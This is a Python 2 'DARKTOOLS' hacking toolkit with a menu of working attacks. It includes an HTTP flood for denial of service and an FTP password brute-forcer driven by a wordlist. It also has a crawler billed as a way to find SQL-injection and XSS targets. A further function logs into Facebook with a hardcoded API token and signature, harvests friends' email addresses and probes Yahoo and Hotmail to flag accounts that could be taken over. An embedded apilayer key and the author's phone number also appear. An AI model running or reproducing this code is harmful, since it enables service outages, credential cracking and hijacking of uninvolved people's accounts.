import sys
import socket
from datetime import datetime
import os
import urllib2
import subprocess
import html2text
import random
import nmap,json,mechanize,requests,urllib
import threading
from time import *
from string import *
from random import *
import re
m = "\033[91m"
g = "\033[92m"
k = "\033[93m"
b = "\033[94m"
u = "\033[95m"
bm = "\033[96m"
p = "\033[97m"
r = "\033[0m"
def pilih():
		pil = raw_input("menu awal(y/t): ")
		if pil == "y":
			main()
		elif pil == "t":
			raise SystemExit("\njangan lupa mampir lagi :D\n")
		else:
			print ("\n\nmasukin pilihan y untuk menu awal dan t untuk keluar\n\n")
			pilih()
		return
		
hem = p + """					\033[104mDARKTOOLS\033[0m\033[95m
           _________                                       
         /'        /|                                      
        /         / |_                                     
       /         /  //|                                    
      /_________/  ////|      \033[94msmart people for you | and enjoy with me\033[95m        
     |   _ _    | 8o////|                                  
     | /'// )_  |   8///|     \033[94mthanks to : Zone - Exploit | Attack Of Cyber\033[95m
     |/ // // ) |   8o///|    \033[94mthanks to : lilo ganteng for banner ASCII :v\033[95m
     / // // //,|  /  8//|                                 
    / // // /// | /   8//|                                 
   / // // ///__|/    8//|                                 
  /.(_)// /// |       8///|                                
 (_)' `(_)//| |       8////|___________                    
(_) /_\ (_)'| |        8///////////////                    
(_) \"/ (_)'|_|         8/////////////                     
 (_)._.(_) d' Hb         8oooooooopb'                      
   `(_)'  d'  H`b                                          
         d'   `b`b          \033[92mCoded by Mr.w0n63d4n\033[95m
        d'     H `b         \033[92mtesting tools please stay with me\033[95m
       d'      `b `b        \033[92mplease support me need support from you :(\033[95m
      d'           `b                                      
     d'             `b\n"""
# my name is yopie rizqi maulana
# nickname me Mr.w0n63dan
# want to recoded ? may permission to me
# wa contact => +628811664850
# appreciate the work of people :)
# testing tools one in seven

def dos(host):
    subprocess.call('cls', shell = True)
    subprocess.call('clear', shell = True)
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    bot = []
    bot.append("http://www.ucshare.net/u4?channel=")
    bot.append("http://www.facebook.com/sharer/sharer.php?u=")
    bot.append("http://validator.w3.org/check?uri=")
    #Mr.w0n63d4n
    print "[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n"
    print "[*]Host to attack: " + host
    ip = socket.gethostbyname(host)
    print "[*]IP of the host: " + ip + "\n\n"
    conn = raw_input("Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    silit = raw_input("Enter your message: ")
    conn = int(conn)
    
    
    for i in range(1,conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
        except socket.error:
            print "\033[91mERROR SERVER DOWN\033[92m"
            continue
        random_index = randrange(len(uagent))
        random_index2 = randrange(len(bot))
        try:
            s.connect((ip,80))
        except socket.error:
            print "\033[91mERROR SERVER DOWN\033[92m"
            continue
        print b + "[*]" + g + "Sending packet!" + k + " %d"%(i)
        s.send("GET / HTTP/1.1\r\n")
        s.send("Host: " + host + silit + "\r\n")
        s.send("User-Agent: " + uagent[random_index] + bot[random_index2] + "\r\n\r\n")
        s.close()
    pilih()  
				
def titit():
    asu = g + "-" * 50 + r
    menu = asu + b + """
				_ * _ one in eight _ * _\n\nCoded by Mr.w0n63d4n\ntesting tools please stay with me\nplease support me need support from you :(\n
    		
""" + r + asu
    return menu

def imdb(movie):
    subprocess.call('cls', shell = True)
    subprocess.call('clear', shell = True)
    print "[*] Accessing IMDB database...\n"
    m = urllib2.urlopen('http://www.imdb.com/find?ref_=nv_sr_fn&q=' + movie.replace(' ','+') + '&s=all')
    m = m.read()
    for i in m.split('\n'):
        if "result_text" in i:
            if "/title/" in i:
                if "/title/" in i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]:
                    link = "http://www.imdb.com" + i.split('href=')[1].split('>')[0].strip("\"").split("?ref")[0]
                
    url = urllib2.urlopen(str(link))
    for line in url.read().split('\n'):
        if 'strong title' in line:
            print line.split('title=')[1].split(">")[0]
    pilih()

def scanner(host):
		subprocess.call('clear', shell=True)
		if os.name == 'nt':
			os.system('cls')
		else:
			os.system('clear')

		print g + "*******************************************"
		print g + "************Simple Port Scanner************"
		print g + "*******************************************"

		if __name__ == '__main__':
			port1 = input("scan port from: ")
			port2 = input("to: ")
			targetIP = socket.gethostbyname(host)
			print g + 'Ready to scan :v ', targetIP
			print g + "please wait proccess scanning..."

    		#scan reserved ports
			daftar = [80,8080,443,143,20,21,22,23,53,119,137,139,161,162,389,1433,1434,3306,1521,1522,1525,1529,1494,1604,]
			#wongedan
			for i in range(port1,port2):
				#kentir
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(0.05)
				result = s.connect_ex((targetIP, i))
				if(result == 0):
					print ('\033[94mPort \033[93m%d: \033[92mOPEN' % (i))
				else:
					print ('\033[94mport \033[93m%d: \033[91mCLOSED' % (i))
				s.close()
		print g + '***********************************************'
		print g + "Scanning finished"
		print g + '***********************************************'
		pilih()
		
def email(host):
    subprocess.call('cls', shell = True)
    subprocess.call('clear', shell = True)
    print"[*] Email addresses found on page: "
    try:
        e = urllib2.urlopen('http://' + str(host))
    except:
        print "Error"
    try:
        e = urllib2.urlopen('http://' + str(host))
    except:
        print "Error"
    try:
        cont = html2text.html2text(e.read())
    except UnicodeDecodeError:
        try:
            cont = html2text.html2text(urllib2.urlopen('http://' + str(host)).read().decode('utf-8'))
        except :
            cont = urllib2.urlopen('http://' + str(host)).read()
    cont = cont.split('\n')
    for line in cont:
        if '@' in line:
            print line
    main()

def banner(host):
    subprocess.call('cls', shell = True)
    subprocess.call('clear', shell = True)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        "Error"
    host = socket.gethostbyname(host)
    port = raw_input("[*] Enter the port of the service: ")
    try:
        s.connect((host,int(port)))
        print "[*] connection successfull\nWaiting for the banner...\n"
        if int(port) == 80:
            s.send('HEAD / HTTP/1.0\r\n\r\n')
        data = s.recv(1024)
        print "\headers:\n" + str(data)
        s.close()
    except:
        print "Connection failed"
    pilih()

def ftp(server):
    subprocess.call('cls', shell = True)
    subprocess.call('clear', shell = True)
    print "[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n"
    password = []
    passw = raw_input("Enter the password file name(eg: pass.txt, wordlist.txt): ")
    username = raw_input("Enter the username to hack(eg: admin, root): ") 
    f = open(str(passw))
    f = f.read()
    f = f.split('\n')
    for i in f:
        password.append(str(i))
    server = socket.gethostbyname(server)
    for password in password:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print "Unable to create Socket."
            main()
        try:
            s.connect((server,21))
        except:
            print "Unable To Connect."
            main()
        data = s.recv(1024)
        s.send('USER ' +username+ '\r\n')
        data = s.recv(1024)
        s.send('PASS ' +password+'\r\n')
        print data
        data += " "+s.recv(1024)
        data += " "+s.recv(1024)
        s.send("Quit\r\n")
        s.close
        print "[*] Tried: " + password + "\n"
        if "230" in data:
            print "password found\n"
            print "[*] Password is: " + password
            main()
        else:
            print '[*] ' + password + " is incorrect"
    print "No password Found. Try another word list or username."

def spider(host):
    subprocess.call('cls', shell = True)
    subprocess.call('clear', shell = True)
    print "[*] Use the result to find promising URLs to try hacking using SQL injection or Xss etc.\n[*] Depth is the level to go inside the website( between 10-20 is enough usually but depends on you).\n[*] Output will also be saved in text files in the same folder as this software.\n"
    depth = raw_input("Enter the depth level in numbers: ")
    count = 1
    url = "http://" + host
    text = open("depth1.txt","w+")
    for i in re.findall('''href=["'](.[^"']+)["']''', urllib2.urlopen(url).read(), re.I):
        if "http" not in i:
		    i = "http://" + host + i
        print i
        text.write(i + '\n')
    text.close()
    while(count <= int(depth)):
        text = open("depth" + str(count) + ".txt", "r")
        text1 = open("depth" + str(count + 1) + ".txt", "w+")
        if text.read() == "":
            print "\n****Finished****"
            main()
        f = text.read().split("\n")
        for j in f:
            if "http" not in j:
                j = "http://" + host + j

            for k in re.findall('''href=["'](.[^"']+)["']''', urllib2.urlopen(j).read(), re.I):
                print k
                text1.write(k + "\n")
        text.close()
        text1.close()		
        count += 1
    pilih()
    
def defense():
    subprocess.call("clear", shell = True)
    reload(sys)
    sys.setdefaultencoding('utf8')
    br = mechanize.Browser()
    y = (g + "-" * 50)
    yopie = (y + p + "\nAuthor :" + g + " Mr.w0n63d4n\n" + r + p + "Github :" + g + " https://github.com/wongedan123\n" + r + p + "Contact wa :" + g + " +628811664850\n" + y + p + "\nLogin fb your account\n" + r)
    br.set_handle_robots(False)
    os.system("clear")
    print yopie
    idt = raw_input(p + "[" + g + "*" + p + "]" + k + " Username/Email\033[0m : " + g)
    passw = raw_input(p + "[" + g + "*" + p + "]" + k + " Password\033[0m : " + g)
    url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
    data = urllib.urlopen(url)
    op = json.load(data)
    if 'access_token' in op:
    	token = (op["access_token"])
    	print (p + "[" + b + "+" + p + "]" + g + " Login successfull")
    else:
    	print (p + "[" + m + "!" + p + "]" + m + " Login failed coba cek connection kamu atau cek fb barangkali dapat security ganti sandi!")
    	sys.exit()
    get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
    hasil = json.loads(get_friends.text)
    print (p + "[" + m + "+" + p + "]" + g + " Berhasil Mendapatkan ID Teman..." + r)
    #cok = open('Mail_Yahoo.txt','w')
    global o, h
    o = []
    h = 0
    print g + 55*"-"
    print g + "| " + 11*" " + u + "Email" + 14*" " + g + "|" + 9*" " + k + "Cek!" + 8*" " + g + "|"
    print 55*"-"
    for i in hasil['data']:
        wrna = "\033[32m"
        wrne = "\033[39m"
        h += 1
        o.append(h)
        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
        z = json.loads(x.text)
        try:
            kunci = re.compile(r'@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = z['email']
                j = br.submit().read()
                Wong = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Wong.search(j).group()
                except:
                    vuln = 6*" " + m + "Not Vuln"
                    #Email Len
                    lean = 30 - (len(z['email']))
                    eml = lean * " "
                    #Name Len
                    lone = 24 - (len(vuln))
                    namel = lone * " "
                    print g + "| " + g + z['email'] + eml + g + "| " + wrne + vuln + namel + g + "|"
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = 8*" " + g + "Vuln"
                else:
                    vuln = 5*" " + m + "Not Vuln"
                #Email Len
                lean = 30 - (len(z['email']))
                eml = lean * " "
                #Mr.w0n63d4n
                lone = 24 - (len(vuln))
                namel = lone * " "
                print g + "| " + g + z['email'] + eml + g + "| " + wrne + vuln + namel + g + "|"
            elif 'hotmail' in cari:
                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1")
                cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                    vuln = 8*" " + g + "Vuln"
                else:
                    vuln = 5*" " + m + "Not Vuln"
                lean = 30 - (len(z['email']))
                eml = lean * " "
                #Name Len
                #Mr.w0n63d4n
                lone = 24 - (len(vuln))
                namel = lone * " "
                print g + "| " + g + z['email'] + eml + g + "| " + wrne + vuln + namel + g + "|"
            else:
                pass
        except KeyError:
            pass
    defense()
    pilih()

def main():
    subprocess.call("clear", shell=True)
    print hem
    print m + "[1].Port Scanning\n[2].DDOS\n[3].HTTP headers\n[4].information all URLs for web hacking\n[5].FTP Password Cracker\n[6].Email Scraping\n[7].IMDB Rating\n[8].Vuln yahoo for Fb\n[9].Exit tools\n" + g
    choice = raw_input("Enter Your Choice: ")
    hostname = raw_input("masukan host untuk nomor 1-6 dan masukan judul film untuk no 7 dan abaikan ini untuk no 8 dan 9: ")
    if choice == '1':
        scanner(hostname)
    elif choice == '6':
        email(hostname)
    elif choice == '3':
        banner(hostname)
    elif choice == '7':
        imdb(hostname)
    elif choice == '5':
        ftp(hostname)
    elif choice == '2':
        dos(hostname)
    elif choice == '4':
        spider(hostname)
    elif choice == '8':
        defense()
    elif choice == '9':
    	subprocess.call("clear", shell = True)
    	raise SystemExit("\nterimkasih sudah berkunjung :')\n")
    else:
        print "enter choice goblog :v"

if __name__ == '__main__':
    main()
    
    